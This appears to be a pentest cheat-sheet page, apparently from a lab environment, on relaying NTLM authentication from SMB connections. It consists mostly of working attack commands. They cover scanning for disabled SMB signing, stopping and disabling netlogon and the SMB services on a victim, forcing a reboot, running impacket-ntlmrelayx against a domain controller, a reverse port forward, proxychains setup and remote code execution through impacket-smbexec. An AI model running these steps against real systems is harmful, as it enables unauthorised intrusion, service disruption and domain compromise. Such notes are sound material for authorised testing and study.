## What is all about?
If a server sends out SMB connections, you can use abuse NTLM relaying to gain a foothold from these SMB connections. 
This attack works by forcing the server to stop SMB traffic and restart the server to send all traffic to the attacker. The attacker can then relay the session where they want.
![](attachment/31bfafe4374949b7e4441c29dd97779b.png)

## MindMap
![](attachment/1ea6c8ebc48aa7434a43bde1b1844832.png)

## Prerequisites
Having SMB signing disabled. Check with: `crackmapexec smb IP`
```
└─# crackmapexec smb 10.200.111.0/24
SMB         10.200.111.35   445    PC-FILESRV01     [*] Windows 10.0 Build 17763 x64 (name:PC-FILESRV01) (domain:holo.live) (signing:False) (SMBv1:False)
SMB         10.200.111.31   445    S-SRV01          [*] Windows 10.0 Build 17763 x64 (name:S-SRV01) (domain:holo.live) (signing:False) (SMBv1:False)
SMB         10.200.111.30   445    DC-SRV01         [*] Windows 10.0 Build 17763 x64 (name:DC-SRV01) (domain:holo.live) (signing:False) (SMBv1:False)
```
Install krb stuff: `apt install krb5-user cifs-utils`

## Attack Metodology
1)Stop netlogon on a victim: 
```
sc stop netlogon
```
2)Stop and disable smb on victim: 
```
sc stop lanmanserver & sc config lanmanserver start= disabled
```
3)Stop and disable LanManserver on victim: 
```
sc stop lanmanworkstation & sc config lanmanworkstation start= disabled
```
4)Restart victim: 
```
shutdown -r -f -t 0
```
5)Start the NTLMrelayx: 
```
impacket-ntlmrelayx -t smb://<DC> -smb2support -socks
```
6)Add a port forwading on a victim(not DC) x.x.x.x.:445 -> YOU: 
```
portfwd add -R -L 0.0.0.0 -l 445 -p 445
```
9)Add NTLMrelayx to /etc/proxychains4.conf: 
```
socks4 127.0.0.1 1080
```
10)Invoke RCE: 
```
proxychains impacket-smbexec -no-pass DOMAIN/USERNAME@IP
```
(the account you can find it at the start of step 6 during the logs in console)